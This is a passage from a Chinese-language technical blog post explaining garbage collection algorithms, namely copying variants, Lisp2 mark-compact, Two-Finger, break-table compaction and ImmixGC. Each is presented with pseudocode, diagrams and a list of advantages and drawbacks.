$free会重合。</p><p>【优点】递归方式遍历子对象减轻了调用函数的额外负担和栈的消耗。特别是拿堆用作队列，省去了用于搜索的内存空间的步骤。</p><p>【缺点】具有引用关系的对象是相邻的才能充分利用缓存的便利。在该算法中使用了广搜致使引用对象并不相邻是比较可惜的一点。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918183343751.png" alt="image-20210918183343751"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918183415724.png" alt="image-20210918183415724"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918183511223.png" alt="image-20210918183511223"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918183639356.png" alt="image-20210918183639356"></p><h5 id="近似深度优先搜索方法"><a href="#近似深度优先搜索方法" class="headerlink" title="近似深度优先搜索方法"></a>近似深度优先搜索方法</h5><p>解决的仍然是<code>递归调用函数</code>的问题，对Cheney 的 GC 复制算法进行了缓存上的优化，Cheney 的 GC 复制算法由于在搜索对象上使用了广度优先搜索，因此存在“没法沾缓存的光”的缺点。近似深度优先搜索方法可以解决这个问题。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929100857389.png" alt="image-20210929100857389"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929100928214.png" alt="image-20210929100928214"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929101028643.png" alt="image-20210929101028643"></p><p>当使用近似深度优先搜索算法时，<strong>如果一个对象被安排在页面开头时，直接搜索该对象的子对象。</strong>概念也比较好理解，广搜的过程中对临近对象使用深搜。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185709778.png" alt="image-20210918185709778"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185803612.png" alt="image-20210918185803612"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185829823.png" alt="image-20210918185829823"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185848639.png" alt="image-20210918185848639"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185916020.png" alt="image-20210918185916020"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185942967.png" alt="image-20210918185942967"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918190014890.png" alt="image-20210918190014890"></p><h5 id="多空间复制算法"><a href="#多空间复制算法" class="headerlink" title="多空间复制算法"></a>多空间复制算法</h5><p>GC 复制算法最大的缺点是只能利用半个堆。如果把堆由分成 2 份改为分成 10 份，其中的2 块空间执行 GC 复制算法。其他8份空间执行其他GC算法，就可以提高堆使用效率。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// multi_space_copying：这里将堆 N 等分，每次To空间和From空间都会后移，其余的对象使用GC标记-清除算法。</span></span><br><span class="line"><span class="built_in">multi_space_copying</span>()&#123;</span><br><span class="line"> $free = $heap[$to_space_index]</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> *r = <span class="built_in">mark_or_copy</span>(*r)</span><br><span class="line"> <span class="keyword">for</span>(index : <span class="number">0.</span>.(N<span class="number">-1</span>))</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">is_copying_index</span>(index) == FALSE)</span><br><span class="line"> <span class="built_in">sweep_block</span>(index)</span><br><span class="line"> $to_space_index = $from_space_index</span><br><span class="line"> $from_space_index = ($from_space_index + <span class="number">1</span>) % N</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mark_or_copy：通过判断obj是否在From空间中来决定使用GC复制算法进行处理还是使用GC标记-清除算法进行处理。</span></span><br><span class="line"><span class="built_in">mark_or_copy</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">is_pointer_to_from_space</span>(obj) == TRUE)</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">copy</span>(obj)</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="keyword">if</span>(obj.mark == FALSE)</span><br><span class="line"> obj.mark = TRUE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> *child = <span class="built_in">mark_or_copy</span>(*child)</span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy：for循环中调用的是 mark_or_copy 函数而非 copy 函数。</span></span><br><span class="line"><span class="built_in">copy</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.tag != COPIED)</span><br><span class="line"> <span class="built_in">copy_data</span>($free, obj, obj.size)</span><br><span class="line"> obj.tag = COPIED</span><br><span class="line"> obj.forwarding = $free</span><br><span class="line"> $free += obj.size</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj.forwarding))</span><br><span class="line"> *child = <span class="built_in">mark_or_copy</span>(*child)</span><br><span class="line"> <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918191659047.png" alt="image-20210918191659047"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918191738967.png" alt="image-20210918191738967"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918192110220.png" alt="image-20210918192110220"></p><p>【优点】提高了堆使用效率。</p><p>【缺点】由于引入了GC-标记清除算法，虽然提高了堆使用效率，但是分配耗费时间、chunk碎片化等问题也会出现。</p><h3 id="GC标记-压缩算法（Mark-Compact-GC）"><a href="#GC标记-压缩算法（Mark-Compact-GC）" class="headerlink" title="GC标记-压缩算法（Mark Compact GC）"></a>GC标记-压缩算法（Mark Compact GC）</h3><h4 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h4><p>GC 标记 - 压缩算法由标记阶段和压缩阶段构成。首先，这里的标记阶段和 GC 标记 - 清除算法时提到的标记阶段完全一致。接下来搜索数次堆来进行压缩。压缩一是可以利用缓存优势，二是可以减少内存碎片，也无需牺牲半个堆。</p><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h4><p>首先是经典的Lisp2算法，Lisp2 算法在对象头提供了 $forwarding 指针的空间。 $forwarding 指针指向要移动位置的地址。这也是这个算法的一个劣势（每个对象都要额外占用一个forwarding 指针）。</p><p>为什么每个对象都要额外占用一个forwarding 指针？（由于GC复制算法中使用了两块空间，将数据完成后再将原From空间的数据段选出一部分当作$frorwarding指针，毕竟当复制过程完毕后原From空间的对象也失去了意义。设置$frorwarding的目的是当有指针指向原From空间的原活动对象时，可以使用$forwarding指针将该指针索引到To空间的活动对象中。而Lisp2算法没有类似于To空间这样的复制空间，而且流程是先设置$forwarding指针再去移动对象，所以之前的对象内容需要进行保留，如果仍使用其数据段会覆盖对象原本的内容（GC复制算法随便修改之前对象的内容，之后都会被全部清空），所以需要额外占用一个forwarding 指针存放要移动到的位置）。</p><h5 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h5><p>Lisp2算法的压缩阶段并不会改变对象的排列顺序，只是缩小了它们之间的空隙，把它们聚集到了堆的一端。他和GC复制算法有个很大的区别就是GC复制算法是对每个对象都进行复制对象，对象指针修改，forwarding指针修改，处理完一个对象再处理下一个对象。而Lisp2算法则是分为三个阶段，每个阶段都处理所有对象。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922155103696.png" alt="image-20210922155103696"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922155125161.png" alt="image-20210922155125161"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922155142861.png" alt="image-20210922155142861"></p><h5 id="压缩阶段"><a href="#压缩阶段" class="headerlink" title="压缩阶段"></a>压缩阶段</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compaction_phase：Lisp2的压缩阶段由三个阶段组成：（1）设定 forwarding 指针； （2）更新指针； （3）移动对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compaction_phase</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="built_in">set_forwarding_ptr</span>()</span><br><span class="line"> <span class="built_in">adjust_ptr</span>()</span><br><span class="line"> <span class="built_in">move_obj</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set_forwarding_ptr：第一阶段遍历一次整个堆空间，并为所有活动对象设定 forwarding指针。</span></span><br><span class="line"><span class="built_in">set_forwarding_ptr</span>()&#123;</span><br><span class="line"> scan = new_address = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>(scan.mark == TRUE)</span><br><span class="line"> scan.forwarding = new_address</span><br><span class="line"> new_address += scan.size</span><br><span class="line"> scan += scan.size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adjust_ptr：第二阶段又遍历一次堆空间。依据第一阶段得出的forwarding指针，将指向原活动对象的指针变为指向原活动对象forwarding指针位置处，也就是新活动对象位置处。</span></span><br><span class="line"><span class="built_in">adjust_ptr</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> *r = (*r).forwarding</span><br><span class="line"> scan = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>(scan.mark == TRUE)</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(scan))</span><br><span class="line"> *child = (*child).forwarding</span><br><span class="line"> scan += scan.size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// move_obj：第三阶段再遍历一次堆空间，将活动对象移动到 forwarding 指针的引用目标处。</span></span><br><span class="line"><span class="built_in">move_obj</span>()&#123;</span><br><span class="line"> scan = $free = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>(scan.mark == TRUE)</span><br><span class="line"> new_address = scan.forwarding</span><br><span class="line"> <span class="built_in">copy_data</span>(new_address, scan, scan.size)</span><br><span class="line"> new_address.forwarding = <span class="literal">NULL</span></span><br><span class="line"> new_address.mark = FALSE</span><br><span class="line"> $free += new_address.size</span><br><span class="line"> scan += scan.size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="评估-3"><a href="#评估-3" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h5><ol><li><code>堆利用率高</code>：一是因为压缩，使得其基本没有碎片化问题。二是相对于GC复制算法，不需要舍弃半个堆，而可以在整个堆中安排对象。堆使用效率几乎是 GC 复制算法的 2 倍。</li></ol><h5 id="缺点-3"><a href="#缺点-3" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>吞吐量较低</code>：以Lisp2算法为例，整个过程需要对整个堆进行三次搜索。执行该算法所花费的时间是和堆大小成正比的。</li></ol><h4 id="优化措施-3"><a href="#优化措施-3" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="Two-Finger算法"><a href="#Two-Finger算法" class="headerlink" title="Two-Finger算法"></a><strong>Two-Finger</strong>算法</h5><p><strong>Two-Finger</strong>算法一是需要所有对象大小一致 ，二是无需forwarding 指针空间 。由以下 2 个步骤构成。（1）移动对象 。 （2）更新指针 。实际上相当于两根手指分别从堆首和堆尾向中间逼近，将后面的活动对象放在前面去，由于对象大小一致，所以这样移动没有任何后顾之忧）</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922164429281.png" alt="image-20210922164429281"></p><p>实现如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// move_obj：移动对象，使用$free 和 live 两个指针从两端向正中间搜索堆。$free 是用于寻找非活动对象（目标空间）的指针，live 是用于寻找活动对象（原空间）的指针。当两个指针相遇时证明已完成压缩。</span></span><br><span class="line"><span class="built_in">move_obj</span>()&#123;</span><br><span class="line"> $free = $heap_start</span><br><span class="line"> live = $heap_end - OBJ_SIZE</span><br><span class="line"> <span class="keyword">while</span>(TRUE)</span><br><span class="line"> <span class="keyword">while</span>($free.mark == TRUE)</span><br><span class="line"> $free += OBJ_SIZE</span><br><span class="line"> <span class="keyword">while</span>(live.mark == FALSE)</span><br><span class="line"> live -= OBJ_SIZE</span><br><span class="line"> <span class="keyword">if</span>($free &lt; live)</span><br><span class="line"> <span class="built_in">copy_data</span>($free, live, OBJ_SIZE)</span><br><span class="line"> live.forwarding = $free</span><br><span class="line"> live.mark = FALSE</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adjust_ptr：调整指向移动前对象的指针，因为移动前的对象位置已经无用，而真正的对象在移动后的位置，所以需要更新指针。</span></span><br><span class="line"><span class="comment">// 这里有个很特别的点，$free指针，由于它的特性，前面都是活动对象，后面都是非活动对象。所以在调整指针的时候可以对指向的位置进行判断，如果在$free后面，就将其赋值为其forwarding 指针位置。（因为后面的对象不用了，所以可以将其对象空间存放forwarding 指针的值而无需单独开辟forwarding 指针的空间。）</span></span><br><span class="line"><span class="built_in">adjust_ptr</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> <span class="keyword">if</span>(*r &gt;= $free)</span><br><span class="line"> *r = (*r).forwarding</span><br><span class="line"> scan = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $free)</span><br><span class="line"> scan.mark = FALSE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(scan))</span><br><span class="line"> <span class="keyword">if</span>(*child &gt;= $free)</span><br><span class="line"> *child = (*child).forwarding</span><br><span class="line"> scan += OBJ_SIZE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929142049472.png" alt="image-20210929142049472"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929142101683.png" alt="image-20210929142101683"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929142121318.png" alt="image-20210929142121318"></p><p>【优点】无需要额外的空间存放 forwarding 指针，相比于 Lisp2 算法提高了堆使用效率。</p><p>【优点】由于优化了更新 forwarding 指针的步骤，所以可以少搜索一次整个堆。</p><p>【缺点】不能利用引用对象相邻的缓存优势，这样操作完全不能保证引用对象相邻。</p><p>【缺点】要求所有对象的大小必须一致。不过可以结合BiBOP 法克服这个问题——将同一大小的对象安排在同一个块里，之后对每个块应用 Two-Finger 算法。如下，每个块的活动对象都在它的起始位置</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929143403705.png" alt="image-20210929143403705"></p><h5 id="表格算法"><a href="#表格算法" class="headerlink" title="表格算法"></a>表格算法</h5><p>这个又是个看起来很恐怖其实也比较好理解的算法。</p><p>表格算法：（1）对象群一起移动。（2）使用了间隙表格来代替forwarding 指针。</p><p>它通过以下 2 个步骤来执行压缩。（1）移动对象（群）以及构筑间隙表格（break table）。（2）更新指针。</p><p>基本思路就是将之前的一个对象一个对象向前移动的方式改为移动对象群，并通过间隙表格存储代替forwarding 指针。间隙表格第一项存储的是被移动对象的起始位置，第二项存储的是要向前移动的长度。（比如下面图片的（100，100）就代表B的起始位置为100，向前移动100到 B<em>Ꞌ</em>）。之后的指针移动也是同理，只不过由原来的通过forwarding 指针索引改编为通过间隙表格索引了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// move_obj：该伪代码只包含了移动对象（群）的操作，而构筑间隙表格（break table）使用了slide_objs_and_make_bt函数实现，伪代码实现比较麻烦，所以下面文字图片方式进行解释。</span></span><br><span class="line"><span class="built_in">move_obj</span>()&#123;</span><br><span class="line"> scan = $free = $heap_start</span><br><span class="line"> size = <span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $heap_end)</span><br><span class="line"> <span class="keyword">while</span>(scan.mark == FALSE)</span><br><span class="line"> size += scan.size</span><br><span class="line"> scan += scan.size</span><br><span class="line"> live = scan</span><br><span class="line"> <span class="keyword">while</span>(scan.mark == TRUE)</span><br><span class="line"> scan += scan.size</span><br><span class="line"> <span class="built_in">slide_objs_and_make_bt</span>(scan, $free, live, size)</span><br><span class="line"> $free += (scan - live)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adjust_ptr：更新指针</span></span><br><span class="line"><span class="built_in">adjust_ptr</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> *r = <span class="built_in">new_address</span>(*r)</span><br><span class="line"> scan = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $free)</span><br><span class="line"> scan.mark = FALSE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(scan))</span><br><span class="line"> *child = <span class="built_in">new_address</span>(*child)</span><br><span class="line"> scan += scan.size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// new_address：替代了之前forwarding指针的作用，返回移动后活动对象的地址。</span></span><br><span class="line"><span class="built_in">new_address</span>(obj)&#123;</span><br><span class="line"> best_entry = <span class="built_in">new_bt_entry</span>(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"> <span class="keyword">for</span>(entry : break_table)</span><br><span class="line"> <span class="keyword">if</span>(entry.address &lt;= obj &amp;&amp; $best_entry.address &lt; entry.address)</span><br><span class="line"> best_entry = entry</span><br><span class="line"> <span class="keyword">return</span> obj - best_entry.size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929163403692.png" alt="image-20210929163403692"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929163424575.png" alt="image-20210929163424575"></p><p>【优点】不需要forwarding 指针，因为它利用了间隙表格来存储相关的信息。但是间隙表格需要准备两个单位的空间来存放对象群信息。</p><p>【优点】因为相较于于Two-Finger算法的压缩过程保留对象顺序，所以可以利用引用对象缓存优势提高对象的访问速度。</p><p>【缺点】要维持间隙表格需要付出很高的代价，因为每次移动活动对象群都要进行表格的移动和更新。</p><p>【缺点】在更新指针时也不能忽略搜索表格所带来的消耗。在更新指针前，如果先将表格排序，则表格的搜索就能高速化。不过排序表格也需要相应的消耗，所以并不能从根本上解决问题。</p><h5 id="ImmixGC算法"><a href="#ImmixGC算法" class="headerlink" title="ImmixGC算法"></a><strong>ImmixGC</strong>算法</h5><p>该算法比较复杂，而且也相对比较新，是Stephen M. Blackburn 和 Kathryn S. McKinley 于 2008 年研究出来的，据说论文的作者把这个算法实现到了 JikesRVM（Research Virtual Machine）A 的内存管理软件包 MMTk（Memory Management Toolkit）中。</p><h6 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h6><p>ImmixGC 把堆分为一定大小的“块”（block），再把每个块分成一定大小的“线”（line）。这个算法不是以对象为单位，而是以线为单位回收垃圾的。分配时程序首先寻找空的线，然后安排对象。没找到空的线时就执行 GC。</p><p>GC 分为以下 3 个步骤执行：（1）选定备用的 From 块。（2）搜索阶段.（3）清除阶段。</p><p>不过该算法不是每次都执行步骤 （1） 的。在 ImmixGC 中，只有在堆消耗严重的情况下，为了分配足够大小的chunk时才会执行压缩。此时会通过步骤 1 来选择作为压缩对象的备用块（备用的 From 块）。</p><p>接下来，在步骤 （2） 中从根搜索对象，根据对象存在于何种块里来分别进行标记操作或复制操作。具体来说，就是对存在于步骤 1 中选择的备用 From 块里的对象执行复制操作，对除此之外的对象进行标记操作。</p><p>步骤 （3） 则是寻找没有被标记的线，按线回收非活动对象。</p><p>以上就是 ImmixGC 的概要。</p><h6 id="堆的构成"><a href="#堆的构成" class="headerlink" title="堆的构成"></a>堆的构成</h6><p>ImmixGC 中把堆分成块，把每个块又分成了更小的线。据论文中记载，块最合适的大小是 32K 字节，线最合适的大小是 128 字节。我们在此就直接引用论文中的数值。这样一来，每个块就有 32×1024÷128 ＝ 256 个线。</p><p>各个块由以下 4 个域构成。</p><p>• line</p><p>• mark_table</p><p>• status</p><p>• hole_cnt</p><p>打个比方，用 $block[i].status 就可以访问位于第 i 号块的 status 域。</p><p> <code>line</code>： line 就跟它的名字一样，是每个块的线，线里会被安排对象。$block[i].line[j] 表示的就是第 i 号块的第 j 号线。</p><p><code>mark_table</code>：mark_table 则是与每个线相对应的用于标记的位串。打个比方，与第 i 号块的第 j 号线相对应的用于标记的位串就是 $block[i].mark_table[j]。我们分给 mark_table[j] 一个字节，在标记或分配下面的某个常量时，将其记录在 mark_table[j] 中。</p><ul><li> FREE（没有对象）</li><li> MARKED（标记完成）</li><li> ALLOCATED（有对象）</li><li> CONSERVATIVE（保守标记）</li></ul><p><code>status</code>：status 是用于表示每个块中的使用情况的域。我们也分给 status 一个字节，在执行GC 或分配时，记录下面的某个常量。</p><ul><li><p> FREE（所有线为空）</p></li><li><p> RECYCLABLE（一部分线为空）</p></li><li><p>UNAVAILABLE（没有空的线）</p><p> 初始状态下所有块都是 FREE</p></li></ul><p><code>hole_cnt</code>：hole_cnt 负责记录各个块的“孔”（hole）数。这里所说的孔拥有连续的大于等于 1 个的空的线。我们用这个 hole_cnt 的值作为表示碎片化严重程度的指标。如果某个chunk的hole_cnt 的值很大，它就很可能被标记为备用From空间，从而使用GC复制算法来进行处理。而hole_cnt 较小的chunk则由GC标记-清除算法进行处理。</p><p>下面的图表示了使用ImmixGC算法的堆情况：</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922184010310.png" alt="image-20210922184010310"></p><h6 id="分配过程"><a href="#分配过程" class="headerlink" title="分配过程"></a>分配过程</h6><p>分配的整体过程如下图所示，核心在于判断mark_table的状态，当mark_table标记为Free才在这个line中分配内存。当然这个过程也会可能会更新chunk的hole_cnt以及status。</p><p>分配过程采取了保守标记，考虑到小型对象可能会占据 line[i+1] 的 情 况，当 mark_table[i+1] 是FREE 时，把 它 定 为 CONSERVATIVE。这 里 的 CONSERVATIVE 的 意 思 是“如 果 小 型 对 象 占 据了 line[i+1]，则 mark_table[i+1] 可能会包含所分配对象的后半部分”（例如图 (a) 的$block[0].line[4] 这样的情况）。不过之后在 line[i+1] 进行分配的时候，要事先将 mark_table[i+1] 的值从 CONSERVATIVE 改写成 ALLOCATED。</p><p>这样保守的标记在标记阶段是很有用的。在标记阶段中，每次搜索对象都必须检查这个对象是否占据了其他的线，为此程序每次都要调查对象的大小，因为要调查所有活动对象，所以这项处理就带来了额外的负担。为了省去这项处理，我们才采取了较为保守的做法，即事先对小型对象打上 CONSERVATIVE这个标记。因为程序中要频繁用到小型对象，所以这个办法是非常有效的。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922184949063.png" alt="image-20210922184949063"></p><h6 id="GC过程"><a 